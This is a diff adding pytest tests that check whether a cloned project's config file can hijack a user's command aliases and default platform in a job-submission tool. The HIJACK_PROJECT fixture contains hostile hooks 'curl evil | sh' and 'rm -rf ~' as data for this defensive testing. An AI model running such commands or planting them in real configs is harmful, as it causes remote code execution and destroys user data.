@@ -323,6 +323,73 @@ def test_exec_does_not_ssh_for_a_cloned_projects_platform(sandbox, tmp_path):
     assert "attacker-host" in marker.read_text()
 
 
+USER_ALIAS = """\
+aliases:
+  dvc:
+    main:
+      cmd: dvc
+      env: dvc3
+"""
+
+HIJACK_PROJECT = """\
+default_platform: evil
+aliases:
+  dvc:
+    main:
+      cmd: dvc push
+    pre: curl evil | sh
+    post: rm -rf ~
+  team:
+    main:
+      cmd: make
+"""
+
+
+@pytest.mark.parametrize("name", ["project.yaml", "local.yaml", "test.yaml"])
+def test_project_cannot_change_the_users_aliases(home, capsys, name):
+    _write_user_config(home, USER_ALIAS)
+    path = _write_project(home / "work", HIJACK_PROJECT, name)
+
+    cm = ConfigManager()
+    assert cm.get_alias("dvc") == {"main": {"cmd": "dvc", "env": "dvc3"}}
+    assert cm.get_default_platform() is None
+    # A project may still add its own aliases for the team
+    assert cm.get_alias("team") == {"main": {"cmd": "make"}}
+    err = capsys.readouterr().err
+    assert str(path) in err
+    assert "aliases.dvc" in err and "default_platform" in err
+    assert "aliases.team" not in err
+
+
+def test_project_cannot_change_a_system_or_override_alias(home, tmp_path):
+    (home / "xdg" / "qxub").mkdir()
+    (home / "xdg" / "qxub" / "config.yaml").write_text(USER_ALIAS)
+    override = tmp_path / "override.yaml"
+    override.write_text("aliases:\n  team:\n    main:\n      cmd: ls\n")
+    _write_project(home / "work", HIJACK_PROJECT)
+
+    cm = ConfigManager(str(override))
+    assert cm.get_alias("dvc")["main"] == {"cmd": "dvc", "env": "dvc3"}
+    assert cm.get_alias("team") == {"main": {"cmd": "ls"}}
+
+
+def test_project_cannot_replace_the_aliases_mapping(home):
+    _write_user_config(home, USER_ALIAS)
+    _write_project(home / "work", "aliases: null\n")
+    assert ConfigManager().get_alias("dvc")["main"]["cmd"] == "dvc"
+
+
+def test_a_trusted_project_may_change_the_users_aliases(home):
+    _write_user_config(
+        home, USER_ALIAS + f"security:\n  trusted_projects: [{home / 'work'}]\n"
+    )
+    _write_project(home / "work", HIJACK_PROJECT)
+
+    cm = ConfigManager()
+    assert cm.get_alias("dvc")["pre"] == "curl evil | sh"
+    assert cm.get_default_platform() == "evil"
+
+
 # -- interpolation and secrets in project config ---------------------------------
 
 LEAKY_PROJECT = """\
